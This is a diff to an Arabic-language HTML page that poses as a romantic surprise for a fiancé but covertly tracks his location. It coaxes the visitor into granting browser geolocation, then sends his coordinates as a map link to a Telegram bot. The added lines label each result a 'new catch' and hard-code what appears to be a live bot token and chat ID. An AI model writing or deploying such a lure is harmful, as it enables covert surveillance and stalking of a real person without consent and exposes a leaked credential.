@@ -8,7 +8,7 @@
         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: url('background_photo.jpg') no-repeat center center fixed; background-size: cover; font-family: sans-serif; text-align: center; color: white; }
         .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.6); z-index: 1; }
         .container { position: relative; z-index: 10; padding: 20px; width: 90%; }
-        .btn { background: #ff4b2b; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 50px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        .btn { background: #ff4b2b; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 50px; cursor: pointer; font-weight: bold; margin-top: 20px; box-shadow: 0 4px 15px rgba(255,75,43,0.4); }
     </style>
 </head>
 <body>
@@ -24,14 +24,29 @@
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
+                    
+                    // بياناتك الصحيحة من الصور
                     const token = "7982889459:AAG0LMNmGSDyVhNsP9Iv-Gz0ZV2HUj-SBI4";
                     const chatId = "5097825068";
                     const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
-                    const text = "📍 خطيبك فتح اللينك ومكانه هو: " + mapUrl;
+                    const text = encodeURIComponent("📍 صيد جديد! خطيبك فتح اللينك ومكانه هو:\n" + mapUrl);
 
-                    fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text))
-                    .then(() => { alert("المفاجأة بتتحمل.. ثواني"); });
-                }, function() { alert("لازم توافق على الوصول للموقع عشان تشوف المفاجأة!"); });
+                    // إرسال الرسالة عن طريق رابط مباشر (API) لضمان السرعة
+                    const telegramApiUrl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + text;
+
+                    fetch(telegramApiUrl)
+                    .then(response => {
+                        if(response.ok) {
+                            alert("المفاجأة بتتحمل حالاً.. استني ثواني ❤️");
+                        }
+                    })
+                    .catch(err => console.error(err));
+
+                }, function(error) {
+                    alert("يا روحي لازم تدوس 'Allow' أو 'سماح' عشان تشوف المفاجأة اللي محضراها!");
+                });
+            } else {
+                alert("المتصفح بتاعك قديم شوية مش بيدعم المفاجأة!");
             }
         }
     </script>
